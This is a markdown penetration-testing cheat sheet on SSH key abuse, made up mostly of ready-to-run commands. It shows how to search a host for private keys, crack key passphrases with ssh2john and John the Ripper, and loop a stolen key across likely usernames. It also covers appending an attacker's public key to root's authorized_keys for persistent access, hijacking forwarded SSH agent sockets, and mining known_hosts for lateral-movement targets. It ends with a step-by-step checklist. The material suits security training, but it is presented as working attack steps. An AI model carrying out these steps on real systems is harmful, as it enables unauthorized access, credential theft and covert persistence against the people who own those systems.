# 13 — SSH Key Abuse

## Overview

SSH authentication can use **key pairs** instead of passwords. This file covers the full range of SSH-key-related privilege escalation and lateral movement vectors: reading exposed private keys, writing to `authorized_keys`, hijacking a forwarded agent, and abusing weak key permissions.

```
Private key (secret, client-side) + Public key (shared, server-side in authorized_keys)
```

If you can read someone's **private** key, or write to someone's `authorized_keys`, you can log in as them without a password.

---

## Part A: Finding Exposed Private Keys

```bash
find / -name "id_rsa" 2>/dev/null
find / -name "id_dsa" 2>/dev/null
find / -name "id_ecdsa" 2>/dev/null
find / -name "id_ed25519" 2>/dev/null
find / -name "*.pem" 2>/dev/null
find / -name "*.ppk" 2>/dev/null
```
**Breakdown:**
- `id_rsa`/`id_ecdsa`/`id_ed25519` = standard OpenSSH private key filenames by algorithm
- `.pem` = common for cloud provider keys (AWS EC2, etc.) and generic certificates
- `.ppk` = PuTTY-format private key (Windows-originated, sometimes left on Linux boxes during migrations)

```bash
# Check home directories specifically, including other users' if readable
ls -la /root/.ssh/ 2>/dev/null
ls -la /home/*/.ssh/ 2>/dev/null
cat /home/*/.ssh/id_rsa 2>/dev/null
```

### Reading a Found Key

```bash
cat /home/steve/.ssh/id_rsa
```
Check if it's encrypted (passphrase-protected):
```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABD...
```
- If it shows `aes256-ctr` / `bcrypt` in the base64 header area → passphrase-protected, needs cracking
- A key with no such markers is usable immediately

### Cracking a Passphrase-Protected Key

```bash
ssh2john id_rsa > id_rsa.hash
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
john --show id_rsa.hash
```
**Breakdown:**
- `ssh2john` = converts an SSH private key into a crackable hash format for John the Ripper
- Works the same way as `unshadow` does for `/etc/shadow` — format conversion for the cracking tool

### Using the Key

```bash
chmod 600 id_rsa
ssh -i id_rsa username@TARGET_IP
```
**Breakdown:**
- SSH refuses keys with permissions looser than `600` (owner read/write only) — this is a client-side security check, so you must fix permissions after copying the key to your own machine
- `-i` = identity file flag, tells SSH client which private key to authenticate with

If you don't know the matching username, try the key against common candidates:
```bash
for user in root ubuntu admin ec2-user steve; do
  ssh -i id_rsa -o PasswordAuthentication=no -o ConnectTimeout=3 $user@TARGET_IP "id" 2>/dev/null
done
```
**Breakdown:**
- `-o PasswordAuthentication=no` = don't fall back to password prompt, fail fast if key doesn't work
- `-o ConnectTimeout=3` = don't hang on unresponsive attempts
- Loop tries the same key across several likely usernames

---

## Part B: Writable authorized_keys (Privilege Escalation / Persistence)

### What is authorized_keys?

```
~/.ssh/authorized_keys
```
Lists **public** keys that are allowed to log in as that user, without a password.

### Check for Write Access

```bash
ls -la /root/.ssh/authorized_keys 2>/dev/null
ls -la /root/.ssh/ 2>/dev/null
find / -name "authorized_keys" -writable 2>/dev/null
```
**Why important:** If `/root/.ssh/authorized_keys` is writable (or `/root/.ssh/` directory itself is writable, allowing you to create the file if it doesn't exist), you can grant yourself passwordless root SSH access.

### Exploit

On your attacker machine, generate a fresh key pair:

```bash
ssh-keygen -t ed25519 -f /tmp/privesc_key -N ""
```
**Breakdown:**
- `-t ed25519` = modern, fast key algorithm
- `-f /tmp/privesc_key` = output filename (creates `privesc_key` and `privesc_key.pub`)
- `-N ""` = empty passphrase (non-interactive, no prompt)

Copy the **public** key content, then on the target:

```bash
mkdir -p /root/.ssh
echo 'ssh-ed25519 AAAAC3Nz...your_pubkey_content... attacker@kali' >> /root/.ssh/authorized_keys
chmod 700 /root/.ssh
chmod 600 /root/.ssh/authorized_keys
```
**Breakdown:**
- `mkdir -p` = create `.ssh` directory if it doesn't already exist (`-p` = no error if it exists)
- Permissions matter: SSH daemon will **silently reject** keys if `.ssh` is not `700` or `authorized_keys` is not `600`/`644` — overly permissive directory/file perms cause SSH to ignore the whole mechanism as a security precaution

Then from attacker machine:

```bash
ssh -i /tmp/privesc_key root@TARGET_IP
id
# uid=0(root)
```

---

## Part C: SSH Agent Hijacking

### What is Agent Forwarding?

`ssh-agent` holds decrypted private keys in memory so you don't have to re-enter a passphrase every connection. **Agent forwarding** (`ssh -A`) lets a remote server use your LOCAL agent's keys to authenticate onward to a third host — without ever copying the private key to the remote server.

**The risk:** If you have root (or the right permissions) on a server where another user has forwarded their agent, you can use their forwarded agent socket to authenticate as them elsewhere, without ever seeing their private key.

### Step 1 — Find Active Agent Sockets

```bash
find / -type s -name "agent.*" 2>/dev/null
ls -la /tmp/ssh-*/agent.* 2>/dev/null
```
**Breakdown:**
- `-type s` = search for sockets specifically (agent sockets are Unix domain sockets, not regular files)
- Typical path pattern: `/tmp/ssh-XXXXXXXXXX/agent.<pid>`

### Step 2 — Check Who Owns It and If You Can Use It

```bash
ls -la /tmp/ssh-abc123/agent.1234
# srw------- 1 steve steve ... agent.1234
```
If you have root, you can access any socket regardless of ownership. If not, you need the owning user's privileges or group access.

### Step 3 — Use the Hijacked Socket

```bash
export SSH_AUTH_SOCK=/tmp/ssh-abc123/agent.1234
ssh-add -l
```
**Breakdown:**
- `SSH_AUTH_SOCK` = environment variable SSH tools use to locate the agent socket
- `ssh-add -l` = list keys currently loaded in that agent (confirms it has usable keys)

```bash
ssh steve@internal-server
# Authenticates using the hijacked agent's loaded key — no private key file needed, no passphrase needed
```
**Why this works:** The agent performs the cryptographic signing operation internally and returns the result — the actual private key material never leaves the agent process memory. Hijacking the socket gives you the ability to request signatures using keys you never had direct access to.

---

## Part D: Known Hosts as Reconnaissance

```bash
cat ~/.ssh/known_hosts
cat /root/.ssh/known_hosts 2>/dev/null
cat /home/*/.ssh/known_hosts 2>/dev/null
```
**Why important:** Reveals other hosts this machine (or user) has connected to — useful for lateral movement targets, internal hostnames, and IP ranges not otherwise visible from this host alone.

If hashed (`HashKnownHosts yes` is set), entries look like random base64 instead of plain hostnames:
```bash
# Hashed format - harder to read directly, but can still be cracked/queried with:
ssh-keygen -F hostname -f known_hosts
```

---

## Quick Checklist

```
[ ] find / -name "id_rsa" -o -name "id_ed25519" -o -name "*.pem" 2>/dev/null  → find private keys
[ ] cat <key> → check for passphrase markers                                  → encrypted or plain
[ ] ssh2john key > hash && john hash                                          → crack if encrypted
[ ] chmod 600 key && ssh -i key user@target                                   → use the key
[ ] find / -name "authorized_keys" -writable 2>/dev/null                      → writable authorized_keys
[ ] ssh-keygen -t ed25519 -f /tmp/key -N ""                                   → generate own keypair
[ ] echo pubkey >> target_authorized_keys                                      → inject access
[ ] find / -type s -name "agent.*" 2>/dev/null                                 → find agent sockets
[ ] export SSH_AUTH_SOCK=<socket> && ssh-add -l                               → hijack agent
[ ] cat ~/.ssh/known_hosts                                                     → recon other hosts
[ ] id                                                                         → confirm access level
```
